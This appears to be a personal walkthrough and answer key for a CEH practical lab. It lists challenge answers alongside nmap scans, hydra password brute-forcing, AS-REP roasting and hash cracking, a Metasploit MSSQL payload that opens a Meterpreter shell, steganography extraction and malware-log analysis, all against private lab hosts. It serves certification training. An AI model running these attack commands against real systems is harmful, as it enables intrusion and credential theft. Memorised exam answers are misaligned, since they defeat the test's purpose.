# PART II - Challenge 1  💬ANSWER: https://www.crushftp.com/💬
nmap -p 21 192.168.10.0/24 --open
nmap -sV -p 21 192.168.10.111
nmap -sV -p 21 192.168.10.222
nmap -sV -p 21 192.168.10.144
wget ftp://anonymous@192.168.10.222/home/nick/exploit_info.txt
ping 192.168.10.111
ping 192.168.10.222
ping 192.168.10.144
sudo find / -type f -iname 'password.txt' 2>/dev/null
hydra -l nick -P /home/attacker/Desktop/password.txt ftp://192.168.10.111
### INFO: [21] [ftp] host:192.168.10.111 login: nick password: apple

ftp 192.168.10.111 # NOUTRO TERMINAL
### USERNAME: nick
### PASSWORD: apple
ls
get 52012.py
cat 52012.py | grep www

# PART II - Challenge 2 💬ANSWER: kety/apple💬
#### C:\Users\Admin\Downloads\MScredremote.pcapng
### FILTER: http.request.method == POST
#### INFO: POST / HTTP/1.1 (application/x-www-form-urlencoded)
#### HTML Form URL Encoded: application/x-www-form-urlencoded
####    Form item: "txtusername" == "kety"
####    Form item: "txtpwdd" == "apple"

# PART II - Challenge 3  💬ANSWER: Quake Network Protocol💬
#### ~/Downloads/ServerDoS.pcapng
wireshark ~/Downloads/ServerDoS.pcapng
#### INFO: 9850 → 26000 Len=0
#### User Datagram Protocol, Src Port: 9850, Dst Port: 26000
#### GOOGLE: 26000 udp protocol 

# PART II - Challenge 4  💬ANSWER: 192.168.10.144💬
#### ~/Documents/DD_attack.pcapng
wireshark ~/Documents/DD_attack.pcapng
### FILTER: udp
### Statistics → Conversations
### INFO: Address A → 192.168.10.144

# PART II - Challenge 5  💬ANSWER: 172.30.10.99💬
#### ~/Downloads/PyD_attack.pcapng
wireshark ~/Downloads/PyD_attack.pcapng
### FILTER: tcp.port == 135
### Statistics → Conversations
### INFO: Address A → 172.30.10.99

# ⚠️ PART II - Challenge 6  💬ANSWER: 192.168.10.222💬 
#### C:\Users\Admin\Documents\report export.txt
Get-Content '.\report export.txt' -TotalCount 20
### INFO: Remote IP Address → 192.168.10.222

# PART II - Challenge 7  💬ANSWER: c3ll0@123💬
find / -type f -name '*.py' 2>/dev/null | grep GetNPU
# nc -vz 192.168.10.222 88
# nc -vz 192.168.10.222 445
# nc -vz 192.168.10.222 135
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py SKILL.CEH/ -no-pass -usersfile ~/users.txt -dc-ip 192.168.0.222 -debug
### INFO: Hashe "Joshua@SKILL.CEH:cbd0830...." 
nano a.txt # Salvar a hashe
find ~ -type f -iname 'rockyou.txt' 2>/dev/null
john --wordlist=/home/attacker/rockyou.txt a.txt
### INFO: c3ll0@123 (?)


# PART II - Challenge 8  💬ANSWER: 7💬
nmap -p 1433 192.168.10.0/24 --open
hydra -L ~/Desktop/username.txt -P ~/Desktop/password.txt 192.168.10.144 mssql
### INFO: [1433] [mssql] host:192.168.10.144 login: Server_mssrv password: Spidy
find / -type f -name 'mssqlclient.py' 2>/dev/null
python3 /root/impacket/examples/mssqlclient.py SKILL.CEH/Server_mssrv:Spidy@192.168.10.144 -port 1433

msfconsole -q -x "use exploit/windows/mssql/mssql_payload; set RHOST 192.168.10.144; set USERNAME Server_mssrv; set PASSWORD Spidy; set DATABASE msdb; exploit; exit"  # NOUTRO TERMINAL
cd /Users/Public/Downloads # NO METERPRETER
dir 
### INFO: Size → 7

# PART II - Challenge 9  💬ANSWER: Pumpkin@1234💬
nmap -p 3389 192.168.10.0/24 --open
hydra -l Maurice -P /home/attacker/rockyou.txt 192.168.10.222 rdp
### INFO: [3389] [rdp] host:192.168.10.222 login: Maurice password: Pumpkin@1234

# ⚠️ PART II - Challenge 10  💬ANSWER: d282💬
#### ~/Donwloads/Tools.rar
sha256sum Tools.rar

# ⚠️ PART II - Challenge 11 💬ANSWER: 6952💬
#### ~/Pictures/Logfile.PML
cd ~/Pictures
python3 -m http.server 8000
ifconfig

#### GOOGLE-CHROME - WORKSATION-1: 172.25.0.10:8000 # Baixar Logfile.PML
#### C:\Users\Admin\Downloads\Logfile.PML
#### E:\CEH-Tools\CEHv13 Module 07 Malware Threats\Malware Analisys\Procmon.exe # Abrir Logfile.PML com essa ferramenta
### File → Open → C:\Users\Admin\Downloads\Logfile.PML → Event Properties
### INFO: 11:36:...   H3ll0.exe   8688   Process Profiling   SUCCESS   User Time: 0.3437...
### INFO: Parent PID → 6952

# ⚠️ PART II - Challenge 12 💬ANSWER: 2.87💬
#### ~/Downloads/Tornado
cd ~/Downloads
python3 -m http.server 8000
ifconfig

#### GOOGLE-CHROME - WORKSATION-1: 172.25.0.10:8000 # Baixar Tornado
#### C:\Users\Admin\Downloads\Tornado
#### E:\CEH-Tools\CEHv13 Module 07 Malware Threats\Malware Analisys\DIE\diel.exe # Abrir Tornado com essa ferramenta
### File → Open file... → C:\Users\Admin\Downloads\Tornado → ELF
### INFO: Total → 2.87903

# PART II - Challenge 13 💬ANSWER: 192.168.10.144💬
nmap -p 2002 192.168.10.0/24
### INFO: 2002/tcp open globe

# PART II - Challenge 14 💬ANSWER: 3965222💬
#### ~/Desktop/stealth.jpeg
steghide extract -sf ~/Desktop/stealth.jpeg
### PASSWORD: azerty@123
open hidden.txt
### INFO: Tender quote for techiquest event 2024: 3965222

# PART II - Challenge 15 💬ANSWER: android/dos/46445.c💬
searchsploit AirDrop 2.0
### INFO: AirDrop 2.0 - Denial of Service (DoS) android/dos/46445.c